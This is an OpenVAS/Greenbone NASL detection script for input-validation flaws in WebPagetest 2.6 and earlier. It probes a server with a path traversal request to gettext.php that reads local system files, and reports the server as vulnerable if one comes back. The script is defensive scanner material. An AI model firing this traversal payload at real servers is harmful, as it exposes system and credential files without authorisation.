###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_WebPagetest_54442.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# WebPagetest Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "WebPagetest is prone to multiple input-validation vulnerabilities
because it fails to sufficiently sanitize user-supplied input.

An attacker can exploit these issues to delete, upload, and download
arbitrary files within the context of the affected application, to
obtain potentially sensitive information from local files, and to
execute arbitrary local scripts in the context of the Web server
process; other attacks are also possible.

WebPagetest 2.6 and prior versions are vulnerable.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103529");
 script_bugtraq_id(54442);
 script_tag(name:"cvss_base", value:"9.7");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:C");
 script_version ("$Revision: 7577 $");
 script_name("WebPagetest Multiple Input Validation Vulnerabilities");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54442");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2012-08-02 14:06:26 +0200 (Thu, 02 Aug 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
   
port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
   
  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( "WebPagetest - Website Performance and Optimization Test" >< buf ) {

    foreach file( keys( files ) ) {
      url = dir + '/gettext.php?file=../../../../../../../../../../../' + files[file];
      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
